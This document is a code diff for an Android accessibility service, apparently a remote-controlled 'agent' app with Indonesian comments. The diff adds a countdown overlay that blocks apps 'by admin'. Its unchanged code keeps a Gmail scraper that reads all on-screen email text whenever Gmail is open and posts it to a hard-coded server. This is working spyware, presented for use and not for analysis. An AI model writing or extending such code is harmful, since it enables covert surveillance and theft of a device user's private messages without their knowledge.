@@ -1,16 +1,20 @@
 package com.ezax.agent;
 
 import android.accessibilityservice.AccessibilityService;
+import android.content.BroadcastReceiver;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.graphics.PixelFormat;
 import android.os.Build;
-import android.util.Log;
+import android.os.CountDownTimer;
 import android.view.Gravity;
 import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.widget.LinearLayout;
 import android.widget.TextView;
 import org.json.JSONObject;
 import java.io.OutputStream;
@@ -22,25 +26,41 @@ import java.util.Set;
 public class JaxAccessibilityService extends AccessibilityService {
     private static final String SERVER_URL = "http://192.168.1.25:5000"; // SESUAIKAN IP
     private Set<String> blockedApps = new HashSet<>();
+    private int blockTimerMinutes = 0;
     private String lastScrapedText = "";
+    
     private WindowManager windowManager;
     private View blockOverlay;
-    private String currentBlockedApp = "";
+    private TextView tvTimer;
+    private CountDownTimer countDownTimer;
+
+    private BroadcastReceiver updateReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            loadBlockData();
+            if (blockOverlay != null && blockedApps.isEmpty()) {
+                hideBlockOverlay();
+            }
+        }
+    };
 
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        loadBlockedApps();
+        registerReceiver(updateReceiver, new IntentFilter("UPDATE_BLOCK_LIST"));
+        loadBlockData();
     }
 
-    private void loadBlockedApps() {
+    private void loadBlockData() {
         SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
         String blockedString = prefs.getString("blocked_apps", "");
+        blockTimerMinutes = prefs.getInt("block_timer", 0);
+        
         blockedApps.clear();
         if (!blockedString.isEmpty()) {
             for (String app : blockedString.split(",")) {
-                blockedApps.add(app.trim());
+                if(!app.trim().isEmpty()) blockedApps.add(app.trim());
             }
         }
     }
@@ -50,28 +70,25 @@ public class JaxAccessibilityService extends AccessibilityService {
         if (event.getPackageName() == null) return;
         String packageName = event.getPackageName().toString();
         
-        // 1. APP BLOCKER (Pakai Overlay Merah)
-        loadBlockedApps();
+        // 1. APP BLOCKER
         if (blockedApps.contains(packageName)) {
-            if (!currentBlockedApp.equals(packageName)) {
-                showBlockOverlay(packageName);
+            if (blockOverlay == null) {
+                showBlockOverlay();
             }
-            return;
         } else {
-            if (!currentBlockedApp.isEmpty()) {
+            // Kalau pindah ke app lain (misal pencet Home), overlay hilang
+            if (blockOverlay != null) {
                 hideBlockOverlay();
             }
         }
 
-        // 2. GMAIL SCRAPER (Simplified: Sedot semua teks layar kalau Gmail kebuka)
+        // 2. GMAIL SCRAPER
         if (packageName.equals("com.google.android.gm")) {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root != null) {
                 StringBuilder sb = new StringBuilder();
                 extractText(root, sb);
                 String finalText = sb.toString().trim();
-                
-                // Kirim kalau teksnya beda & lumayan panjang (biar gak spam)
                 if (finalText.length() > 30 && !finalText.equals(lastScrapedText)) {
                     lastScrapedText = finalText;
                     kirimKeWeb("gmail", finalText);
@@ -80,42 +97,73 @@ public class JaxAccessibilityService extends AccessibilityService {
         }
     }
 
-    private void showBlockOverlay(String packageName) {
-        currentBlockedApp = packageName;
-        if (blockOverlay != null) return;
+    private void showBlockOverlay() {
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setGravity(Gravity.CENTER);
+        layout.setBackgroundColor(0xFFAA0000); // Merah Gelap
 
-        TextView textView = new TextView(this);
-        textView.setText("🚫\n\nAKSES DIBLOKIR\nOLEH ADMIN\n\nAplikasi ini tidak diizinkan.");
-        textView.setTextColor(0xFFFFFFFF);
-        textView.setTextSize(24f);
-        textView.setGravity(Gravity.CENTER);
-        textView.setBackgroundColor(0xFFAA0000); // Warna Merah Gelap
-        textView.setPadding(50, 50, 50, 50);
+        TextView title = new TextView(this);
+        title.setText("🚫 AKSES DIBLOKIR\nOLEH ADMIN\n\n");
+        title.setTextColor(0xFFFFFFFF);
+        title.setTextSize(28f);
+        title.setGravity(Gravity.CENTER);
+        
+        tvTimer = new TextView(this);
+        tvTimer.setTextColor(0xFFFFFF00); // Kuning
+        tvTimer.setTextSize(22f);
+        tvTimer.setGravity(Gravity.CENTER);
 
-        int layoutFlag;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
-        } else {
-            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
-        }
+        layout.addView(title);
+        layout.addView(tvTimer);
 
+        int layoutFlag = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 
+                WindowManager.LayoutParams.TYPE_PHONE;
+
+        // FLAG_NOT_FOCUSABLE = Bikin tombol Home/Back/Recent tetap berfungsi
+        // FLAG_LAYOUT_IN_SCREEN = Nutupin seluruh layar
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 layoutFlag,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, // Biar user gak bisa ngeklik apa-apa
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                 PixelFormat.TRANSLUCENT);
-
-        windowManager.addView(textView, params);
-        blockOverlay = textView;
         
-        // Balikin ke Home Screen di belakang overlay
-        performGlobalAction(GLOBAL_ACTION_HOME);
+        windowManager.addView(layout, params);
+        blockOverlay = layout;
+
+        startTimer();
+    }
+
+    private void startTimer() {
+        if (blockTimerMinutes == 0) {
+            tvTimer.setText("STATUS: PERMANEN");
+            return;
+        }
+
+        if (countDownTimer != null) countDownTimer.cancel();
+        
+        long duration = blockTimerMinutes * 60 * 1000L;
+        countDownTimer = new CountDownTimer(duration, 1000) {
+            @Override
+            public void onTick(long millisUntilFinished) {
+                long mins = millisUntilFinished / 60000;
+                long secs = (millisUntilFinished % 60000) / 1000;
+                tvTimer.setText(String.format("Sisa Waktu: %02d:%02d", mins, secs));
+            }
+            @Override
+            public void onFinish() {
+                // Timer habis, hapus dari blocklist
+                SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
+                prefs.edit().putString("blocked_apps", "").apply();
+                hideBlockOverlay();
+            }
+        }.start();
     }
 
     private void hideBlockOverlay() {
-        currentBlockedApp = "";
+        if (countDownTimer != null) countDownTimer.cancel();
         if (blockOverlay != null) {
             try { windowManager.removeView(blockOverlay); } catch (Exception e) {}
             blockOverlay = null;
